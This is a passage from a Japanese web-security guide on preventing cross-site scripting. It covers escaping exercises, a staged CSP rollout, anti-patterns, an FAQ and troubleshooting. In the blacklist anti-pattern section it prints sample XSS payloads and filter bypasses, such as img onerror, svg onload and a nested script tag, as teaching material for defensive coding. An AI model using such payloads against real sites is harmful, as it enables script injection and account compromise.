    かえってパフォーマンスが向上する場合もある
    （不要な外部リソースの読み込みをブロック）
```

---

## 演習

### 演習1: 基礎 — コンテキスト別エスケープ

**課題**: 以下の各コンテキストで安全に出力するエスケープ関数を実装せよ。

```
要件:
1. HTMLボディコンテキストでのエスケープ
2. HTML属性コンテキストでのエスケープ（クォート付き）
3. JavaScriptコンテキストでのエスケープ
4. URLコンテキストでのエスケープ

テスト:
- 各関数に <script>alert(1)</script> を入力してXSSが発生しないこと
- " ' < > & の各文字が正しくエスケープされること
```

### 演習2: 応用 — CSPの段階的導入

**課題**: 既存のWebアプリケーションにCSPを段階的に導入せよ。

```
要件:
1. Report-Only モードでCSPを設定
2. CSP違反レポートを収集・分析するエンドポイントを実装
3. インラインスクリプトをnonceベースに書き換え
4. 外部リソースのホワイトリストを作成
5. 強制モードに切り替え

検証:
- Google CSP Evaluator でポリシーを評価
- ブラウザの DevTools Console で CSP 違反を確認
```

### 演習3: 発展 — XSS脆弱性スキャナー

**課題**: 簡易的なXSS脆弱性スキャナーを実装せよ。

```
要件:
1. URLとパラメータ名を指定して Reflected XSS をテスト
2. 複数のペイロード（<script>, <img onerror>, <svg onload> 等）を試行
3. レスポンス内にペイロードがエスケープされずに反映されているか検出
4. CSPヘッダーの有無と設定内容を分析
5. テスト結果のレポートを生成

注意: 必ず自分が管理するサーバーに対してのみ実行すること
```

---

## アンチパターン

### アンチパターン1: ブラックリスト方式のフィルタリング

`<script>` タグだけをフィルタするアプローチ。XSSのバイパス手法は無数に存在するため、ブラックリストでは防ぎきれない。ホワイトリスト方式（許可するタグ・属性を限定）を採用すべきである。

```python
# NG: ブラックリスト方式
def sanitize_bad(input_html):
    return input_html.replace("<script>", "").replace("</script>", "")
# バイパス: <scr<script>ipt>alert(1)</scr</script>ipt>
# バイパス: <ScRiPt>alert(1)</ScRiPt>
# バイパス: <img src=x onerror=alert(1)>
# バイパス: <svg onload=alert(1)>

# OK: ホワイトリスト方式（DOMPurifyまたはbleach）
import bleach
def sanitize_good(input_html):
    return bleach.clean(input_html,
                       tags=["b", "i", "a"],
                       attributes={"a": ["href"]})
```

### アンチパターン2: クライアントサイドのみの対策

JavaScriptでの入力検証だけに頼るパターン。攻撃者はブラウザを経由せずAPIに直接リクエストを送信できるため、サーバーサイドでの検証が必須である。

### アンチパターン3: innerHTML の乱用

```javascript
// NG: ユーザー入力を innerHTML に代入
document.getElementById("output").innerHTML = userInput;

// NG: jQuery の .html() もinnerHTMLと同様
$('#output').html(userInput);

// OK: textContent を使用
document.getElementById("output").textContent = userInput;

// OK: jQuery の .text() を使用
$('#output').text(userInput);

// OK: どうしても HTML を挿入する場合は DOMPurify 経由
document.getElementById("output").innerHTML =
    DOMPurify.sanitize(userInput);
```

---

## FAQ

### Q1: 自動エスケープがあるフレームワークでもXSSは発生しますか?

発生する。`dangerouslySetInnerHTML`（React）、`v-html`（Vue）、`|safe`（Django/Jinja2）など、自動エスケープをバイパスする機能を使う場合にXSSが発生する。これらの使用は最小限にし、使用する場合はDOMPurify等でサニタイズする。

### Q2: CSPだけでXSSを完全に防げますか?

CSPだけでは不十分。CSPはXSSの影響を軽減する強力なツールだが、以下の場合はバイパスされる可能性がある:
- `'unsafe-inline'` が設定されている場合
- CSPバイパスガジェット（許可されたドメインにJSONPエンドポイントがある場合等）
- DOM-based XSSの一部（データの流れがクライアント側で完結する場合）
入力検証、出力エスケープ、CSPの多層防御が必要である。

### Q3: HttpOnly CookieはXSSに対して万全ですか?

HttpOnlyはJavaScriptからのCookieアクセスを防ぐが、XSS自体を防ぐものではない。XSSが成功すれば以下の攻撃が可能:
- APIリクエストの送信（Cookie は自動的に含まれる）
- ページ内容の改ざん
- キーストロークの傍受
- フィッシングフォームの表示
Cookie窃取以外の攻撃手段は依然として有効である。

### Q4: SVGファイルのアップロードを許可しても安全ですか?

SVGはXMLベースであり、`<script>` タグやイベントハンドラを含むことができるため、XSSのリスクがある。SVGを許可する場合は:
- SVGのサニタイゼーション（DOMPurifyのSVGモード）
- 別ドメイン（CDN）から配信
- Content-Type を `image/svg+xml` に設定
- `<img>` タグ経由でのみ表示（scriptは実行されない）

### Q5: Markdown のレンダリングでXSSは発生しますか?

MarkdownをHTMLに変換する過程でXSSが発生する場合がある。特に、生のHTMLを許可するMarkdownパーサー（例: marked.js のデフォルト設定）は危険。対策:
- `sanitize: true` オプションを有効にする
- 変換後のHTMLをDOMPurifyでサニタイズする
- marked.js + DOMPurify の組み合わせが推奨

### Q6: Content-Security-Policy と Content-Security-Policy-Report-Only の違いは?

`Content-Security-Policy` はポリシーに違反するリソースの読み込みをブロックする。`Content-Security-Policy-Report-Only` はブロックせずに違反のみレポートする。CSP導入時はまず Report-Only で影響を確認し、問題がないことを確認してから強制モードに切り替えるのが推奨パターン。

---

## トラブルシューティング

### CSPを設定したらサイトが動かなくなった

```
チェックリスト:
1. ブラウザの DevTools Console でCSP違反エラーを確認
2. Report-Only モードに戻して違反レポートを収集
3. インラインスクリプトがある場合:
   → nonce または hash を設定
4. 外部CDNのスクリプト/スタイルがある場合:
   → script-src / style-src に追加
5. Google Analytics, Tag Manager 等:
   → 'strict-dynamic' + nonce で対応
6. eval() を使うライブラリがある場合:
   → 'unsafe-eval' を追加（リスクを理解した上で）
   → 可能であれば eval() を使わないライブラリに移行
```

### DOMPurify でHTMLが壊れる

```
チェックリスト:
1. ALLOWED_TAGS に必要なタグが含まれているか確認
2. ALLOWED_ATTR に必要な属性が含まれているか確認
3. class, id 等の汎用属性が許可されているか
4. SVG / MathML を使用する場合:
   → USE_PROFILES で明示的に有効化
5. カスタム data-* 属性:
   → ALLOW_DATA_ATTR: true を設定
```

---

## まとめ

| 対策 | 効果 | 適用タイミング | 重要度 |
|------|------|---------------|--------|
| 自動エスケープ | 出力時のHTMLインジェクション防止 | テンプレートレンダリング | 必須 |
| サニタイゼーション | 許可されたHTMLのみ通過 | ユーザー生成コンテンツの保存時 | 推奨 |
| CSP | インラインスクリプトの実行防止 | HTTPレスポンスヘッダー | 強く推奨 |
| Nonce-based CSP | CSPのバイパス防止 | 動的ページ | 推奨 |
| HttpOnly Cookie | Cookie窃取の防止 | Cookie設定 | 必須 |
| コンテキスト別エスケープ | 各出力先での安全な表示 | 全出力処理 | 必須 |
| Trusted Types | DOM操作のXSS防止 | クライアントJS | 推奨 |
| X-Content-Type-Options | MIMEスニッフィング防止 | HTTPヘッダー | 必須 |

---

## 次に読むべきガイド

- [02-csrf-clickjacking.md](./02-csrf-clickjacking.md) -- CSRF/クリックジャッキング対策
- [03-injection.md](./03-injection.md) -- インジェクション攻撃全般
- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- セキュアコーディング全般
- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- 暗号化通信

---

## 参考文献

1. OWASP XSS Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. MDN Web Docs: Content Security Policy -- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
3. DOMPurify -- https://github.com/cure53/DOMPurify
4. Google CSP Evaluator -- https://csp-evaluator.withgoogle.com/
5. PortSwigger: Cross-Site Scripting -- https://portswigger.net/web-security/cross-site-scripting
6. CWE-79: Improper Neutralization of Input During Web Page Generation -- https://cwe.mitre.org/data/definitions/79.html
7. Trusted Types API -- https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
8. HTML Living Standard: Parsing -- https://html.spec.whatwg.org/multipage/parsing.html
